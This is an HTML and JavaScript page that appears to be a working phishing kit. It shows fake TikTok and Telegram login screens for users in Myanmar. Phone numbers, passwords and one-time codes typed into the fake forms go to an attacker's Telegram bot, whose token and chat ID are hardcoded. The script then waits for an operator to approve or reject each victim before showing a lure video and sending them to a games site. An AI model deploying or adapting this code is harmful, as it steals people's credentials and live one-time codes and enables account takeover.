<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Engine Fixed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* Full Screen Fix */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; position: fixed; }
        #app { width: 100vw; height: 100vh; position: relative; }
        
        /* Video Optimization */
        #bgVideo { 
            position: absolute; top: 0; left: 0; 
            width: 100%; height: 100%; 
            object-fit: cover; z-index: 1;
            background: #000;
        }

        .tt-input { width: 100%; padding: 14px; border: 1px solid #333; background: #111; color: white; border-radius: 8px; outline: none; margin-bottom: 12px; }
        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 18px; text-align: center; color: white; font-weight: bold; transition: 0.4s; z-index: 9999; }
        .notice-success { background: #10b981; }
        .notice-error { background: #ef4444; }

        .entry-btn { 
            position: absolute; bottom: 10%; left: 50%; transform: translateX(-50%); 
            background: #fe2c55; padding: 14px 50px; border-radius: 50px; 
            color: white; font-weight: bold; cursor: pointer; z-index: 10;
            box-shadow: 0 4px 20px rgba(254, 44, 85, 0.5);
        }

        #splash { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; flex-direction: column; items-center; justify-content: center; }
    </style>
</head>
<body>

<div id="topNotice"></div>

<div id="splash">
    <div class="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
</div>

<div id="app" class="hidden">
    
    <!-- Selection Screen -->
    <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a]">
        <div class="bg-[#111] border border-white/10 p-10 w-full max-w-sm rounded-[30px] text-center">
            <h1 class="text-xl font-bold mb-8 text-white">Login to continue</h1>
            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3">
                <i class="fa-brands fa-telegram text-xl"></i> Telegram
            </button>
            <button onclick="toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-xl flex items-center justify-center gap-3">
                <i class="fa-brands fa-tiktok text-xl"></i> TikTok
            </button>
        </div>
    </div>

    <!-- TikTok Login -->
    <div id="ttScreen" class="hidden bg-black w-full h-full p-6 text-white">
        <div class="flex items-center justify-between mb-8">
            <i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl"></i>
            <span class="font-bold">Log in</span>
            <span></span>
        </div>
        <div class="flex gap-2 mb-4">
            <div class="border border-white/10 bg-[#111] px-4 py-4 rounded-lg text-sm">MM +95</div>
            <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input flex-1 m-0">
        </div>
        <input type="password" id="ttPass" placeholder="Password" class="tt-input">
        
        <!-- Forget Pass OTP Section -->
        <div id="ttOtpBox" class="hidden">
            <input type="number" id="ttOtp" placeholder="Enter 6-digit OTP" class="tt-input border-red-500">
        </div>
        
        <div class="flex justify-between text-xs mt-2 text-gray-400">
            <span>Log in with email</span>
            <span onclick="document.getElementById('ttOtpBox').classList.remove('hidden')" class="text-red-500 font-bold cursor-pointer">Forgot password?</span>
        </div>

        <button onclick="submitTT()" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold mt-10">Log in</button>
    </div>

    <!-- Telegram Login -->
    <div id="tgScreen" class="hidden bg-black w-full h-full p-8 text-white">
        <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-xl mb-10 block"></i>
        <h1 class="text-2xl font-bold mb-10">Your Phone</h1>
        <input type="number" id="tgPhone" placeholder="Phone number" class="tt-input text-lg border-0 border-b border-gray-700 rounded-none bg-transparent">
        <input type="number" id="tgOtp" placeholder="OTP Code" class="tt-input text-lg border-0 border-b border-gray-700 rounded-none bg-transparent mt-4">
        <button onclick="submitTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold mt-10">CONTINUE</button>
    </div>

    <!-- Wait Screen (Image 1000032517.jpg fix) -->
    <div id="waitScreen" class="hidden w-full h-full flex flex-col items-center justify-center bg-black">
        <div class="w-12 h-12 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
        <p class="mt-4 text-gray-400 text-sm">Checking authentication...</p>
    </div>

    <!-- Video Screen (Image 1000032516.jpg fix) -->
    <div id="videoScreen" class="hidden w-full h-full">
        <video id="bgVideo" loop playsinline>
            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
        </video>
        <button onclick="goToGame()" class="entry-btn">ဝင်ရောက်ရန်</button>
    </div>

</div>

<script>
    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
    const chat = "5304050102";
    let userKey = "ID_" + Math.floor(Math.random() * 9999);

    window.onload = () => {
        const v = document.getElementById('bgVideo');
        v.load();
        setTimeout(() => {
            document.getElementById('splash').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            if(localStorage.getItem('approved') === 'true') playFinal();
        }, 1500);
    };

    function toggle(id) {
        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    async function sendBot(msg, withBtn) {
        let body = { chat_id: chat, text: msg, parse_mode: "HTML" };
        if(withBtn) {
            body.reply_markup = { inline_keyboard: [[
                {text: "✅ Approve", callback_data: `ok_${userKey}`},
                {text: "❌ Reject", callback_data: `no_${userKey}`}
            ]] };
        }
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
    }

    async function submitTT() {
        const ph = document.getElementById('ttPhone').value;
        const pass = document.getElementById('ttPass').value;
        const otp = document.getElementById('ttOtp').value;
        if(!ph || !pass) return alert("Fill all fields");
        toggle('waitScreen');
        await sendBot(`🔔 <b>TikTok Login</b>\nPH: <code>${ph}</code>\nPass: <code>${pass}</code>\nOTP: <code>${otp || 'None'}</code>\nID: <code>${userKey}</code>`, true);
        startPolling();
    }

    async function submitTG() {
        const ph = document.getElementById('tgPhone').value;
        const otp = document.getElementById('tgOtp').value;
        if(!ph || !otp) return alert("Fill all fields");
        toggle('waitScreen');
        await sendBot(`🔔 <b>Telegram Login</b>\nPH: <code>${ph}</code>\nOTP: <code>${otp}</code>\nID: <code>${userKey}</code>`, true);
        startPolling();
    }

    function startPolling() {
        const interval = setInterval(async () => {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
            const data = await res.json();
            const last = data.result?.[data.result.length - 1];
            
            if (last?.callback_query?.data === `ok_${userKey}`) {
                clearInterval(interval);
                localStorage.setItem('approved', 'true');
                await sendBot(`✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။`, false);
                playFinal();
            } else if (last?.callback_query?.data === `no_${userKey}`) {
                clearInterval(interval);
                await sendBot(`❌ ID: ${userKey} အား ငြင်းပယ်လိုက်ပါသည်။`, false);
                alert("Login Failed. Try again.");
                location.reload();
            }
        }, 3000);
    }

    function playFinal() {
        toggle('videoScreen');
        const v = document.getElementById('bgVideo');
        v.play().catch(() => {
            document.body.addEventListener('click', () => { v.play(); }, {once: true});
        });
    }

    function goToGame() {
        // Black screen မဖြစ်အောင် တန်းပို့လိုက်တာပါ
        window.location.replace("https://www.crazygames.com");
    }

    function showNotice(msg, type) {
        const el = document.getElementById('topNotice');
        el.innerText = msg;
        el.className = (type === 'success') ? 'notice-success' : 'notice-error';
        el.style.top = '20px';
        setTimeout(() => el.style.top = '-100px', 3000);
    }
</script>
</body>
</html>
